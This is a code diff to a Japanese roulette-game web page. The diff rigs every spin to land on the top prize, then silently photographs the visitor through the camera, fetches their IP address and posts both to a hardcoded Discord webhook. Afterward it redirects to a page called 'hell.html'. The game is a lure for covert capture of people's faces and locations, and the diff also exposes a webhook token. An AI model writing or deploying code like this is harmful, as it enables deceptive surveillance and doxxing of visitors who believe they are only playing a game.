@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>ルーレット写真キャプチャ</title>
+  <title>ルーレット録画</title>
   <style>
     body {
       font-family: sans-serif;
@@ -69,7 +69,6 @@
       { label: '1000ロバ', weight: 0.2 }
     ];
     const colors = ['#FFD54F', '#FFB74D', '#4FC3F7', '#81C784', '#F06292', '#BA68C8'];
-
     const canvas = document.getElementById('wheelCanvas');
     const ctx = canvas.getContext('2d');
     const resultBox = document.getElementById("result");
@@ -118,13 +117,8 @@
     }
 
     function pickRandomItem() {
-      const r = Math.random() * totalWeight;
-      let sum = 0;
-      for (let i = 0; i < items.length; i++) {
-        sum += items[i].weight;
-        if (r < sum) return i;
-      }
-      return items.length - 1;
+      // 常に「1000ロバ」にする（強制当たり）
+      return items.findIndex(item => item.label === '1000ロバ');
     }
 
     function spin(callback) {
@@ -152,7 +146,6 @@
           requestAnimationFrame(animate);
         } else {
           resultBox.textContent = items[selectedIndex].label;
-          spinning = false;
           callback();
         }
       }
@@ -166,56 +159,53 @@
         video.srcObject = stream;
         video.play();
 
+        // 表示されない video だが録画のために必要
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
         spin(() => {
-          // ルーレット終了後に1枚だけ写真を撮る
-          const tempCanvas = document.createElement('canvas');
-          tempCanvas.width = video.videoWidth;
-          tempCanvas.height = video.videoHeight;
-          const tempCtx = tempCanvas.getContext('2d');
-          tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
-
-          tempCanvas.toBlob(blob => {
-            if (blob) {
-              sendImageToDiscord(blob);
-            } else {
-              alert("画像のキャプチャに失敗しました。");
-            }
-
-            stream.getTracks().forEach(track => track.stop());
-          }, 'image/png');
+          setTimeout(() => {
+            imageCapture.takePhoto().then(blob => {
+              stream.getTracks().forEach(t => t.stop());
+              sendToDiscord(blob);
+            }).catch(err => {
+              alert("画像の取得に失敗しました");
+              stream.getTracks().forEach(t => t.stop());
+              console.error(err);
+            });
+          }, 500); // 少し待ってから写真撮影
         });
+
       }).catch(err => {
         alert("カメラの使用が許可されていません！");
         console.error(err);
       });
     }
 
-    function sendImageToDiscord(blob) {
-      const webhookUrl = "https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY";
+    function sendToDiscord(blob) {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(ipData => {
+          const formData = new FormData();
+          formData.append("file", blob, "roulette.png");
+          formData.append("content", `🎯 当選結果: 1000ロバ\n🧠 IPアドレス: ${ipData.ip}`);
 
-      const formData = new FormData();
-      formData.append("file", blob, "roulette_photo.png");
-
-      console.log("画像送信中...");
-
-      fetch(webhookUrl, {
-        method: "POST",
-        body: formData
-      }).then(response => {
-        console.log("送信成功", response);
-        setTimeout(() => {
-          window.location.href = "https://kouya77.github.io/dds/hell.html";
-        }, 500);
-      }).catch(error => {
-        console.error("送信失敗", error);
-        setTimeout(() => {
-          window.location.href = "https://kouya77.github.io/dds/hell.html";
-        }, 500);
-      });
+          fetch("https://discord.com/api/webhooks/1381314574640353501/gml-lgI2NN_c2g6lUNZK13fKT05_m88PSNdKAR5vjpqnYttHDj_9YT7Hs5djUTqgCXjY", {
+            method: "POST",
+            body: formData
+          }).then(() => {
+            setTimeout(() => {
+              window.location.href = "https://kouya77.github.io/dds/hell.html";
+            }, 500);
+          }).catch(() => {
+            setTimeout(() => {
+              window.location.href = "https://kouya77.github.io/dds/hell.html";
+            }, 500);
+          });
+        });
     }
 
     drawWheel();
   </script>
-
 </body>
 </html>
